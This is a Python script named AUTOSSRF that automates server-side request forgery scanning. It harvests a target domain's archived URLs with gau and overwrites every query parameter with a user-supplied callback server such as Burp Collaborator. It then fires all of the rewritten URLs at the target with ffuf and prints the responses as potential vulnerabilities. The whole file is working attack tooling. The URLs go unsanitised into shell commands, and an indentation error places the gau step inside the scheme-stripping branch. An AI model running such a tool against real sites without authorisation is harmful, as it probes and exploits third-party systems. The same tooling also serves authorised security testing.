#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import re

def remove_ansi_escape_sequences(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def main():
    parser = argparse.ArgumentParser(description='AUTOSSRF')
    parser.add_argument('-d', '--domain', required=False, help='The domain for which you want to test')
    parser.add_argument('-s', '--server', required=True, help='Your server which detects SSRF. Eg. Burp collaborator')
    parser.add_argument('-f', '--file', required=False, help='Optional argument. You give your own custom URLs instead of using gau')
    args = parser.parse_args()

    domain = args.domain
    server = args.server
    file = args.file if args.file else ""


    if domain:
        if domain.startswith("https"):
            domain = domain[8:]
        elif domain.startswith("http"):
            domain = domain[7:]

        ## Gau to fetch URLs
            gau_command = f'gau {domain} | tee -a raw_urls.txt'
            gau_out = subprocess.Popen(gau_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            output = gau_out.communicate()

    elif file:
        if not os.path.isfile(file):
            print(f"The given file does not exist")
            sys.exit(2)
        subprocess.run(['cat', file], stdout=open("raw_urls.txt", 'w'))
    
    else:
        print("Please provide a domain or a file")
        sys.exit(1)

    if not server.startswith("http"):
        server = f"http://{server}"

    ## Parameterising the URLs
    try:
        first_command = f" uniq raw_urls.txt | grep '?' | sort | qsreplace '' >> temp-parameterised_urls.txt"
        subprocess.run(first_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        second_command = f"cat raw_urls.txt | grep '=' >> parameterised_urls.txt"
        subprocess.run(second_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    
    with open("parameterised_urls.txt", 'r') as infile, open("final_urls.txt", 'w') as outfile:
        for url in infile:
            if "burp" in server:
                rs = f"{server}/{url.strip()}"
            else:
                rs = server
            command = f"echo {url.strip()} | qsreplace {rs} | grep '=' >> final_urls.txt"
            subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            

    ## SSRF Testing
    ssrf_command = "ffuf -w final_urls.txt -u FUZZ"
    ssrf_out = subprocess.Popen(ssrf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    output = ssrf_out.communicate()
    clean_output = remove_ansi_escape_sequences(output[0])
    urls = clean_output.split("\n")
    for url in urls:
        print(f"[Potential Vuln] {url}")
    subprocess.run(['rm', '-f', 'raw_urls.txt', 'temp-parameterised_urls.txt', 'parameterised_urls.txt', 'final_urls.txt'])

if __name__ == "__main__":
    main()